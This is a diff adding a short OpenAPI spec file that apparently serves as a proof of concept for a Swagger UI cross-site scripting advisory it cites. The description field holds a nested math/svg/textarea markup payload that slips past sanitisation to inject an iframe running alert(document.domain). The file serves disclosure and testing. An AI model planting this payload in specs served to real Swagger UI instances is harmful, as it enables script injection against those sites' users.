@@ -1,0 +1,8 @@
+openapi: "3.0.0"
+
+info:
+  title: SwaggerUI url parameter
+  description:
+    <h4>xss</h4>
+    <i>Ref: </i>https://github.com/swagger-api/swagger-ui/security/advisories/GHSA-qrmm-w75w-3wpx
+    P0C<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
